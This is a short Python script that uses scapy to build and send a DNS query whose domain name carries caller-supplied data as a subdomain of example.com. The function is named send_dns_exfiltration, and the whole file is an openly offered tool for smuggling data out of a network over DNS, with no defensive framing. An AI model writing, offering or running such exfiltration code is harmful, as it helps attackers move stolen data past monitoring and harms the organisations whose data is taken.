import sys
from scapy.all import *

def send_dns_exfiltration(target_ip, data):
    dns_query = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=data + ".example.com"))

    send(dns_query)

if __name__ == "__main__":

    target_ip = sys.argv[1]
    data = sys.argv[2]

    send_dns_exfiltration(target_ip, data)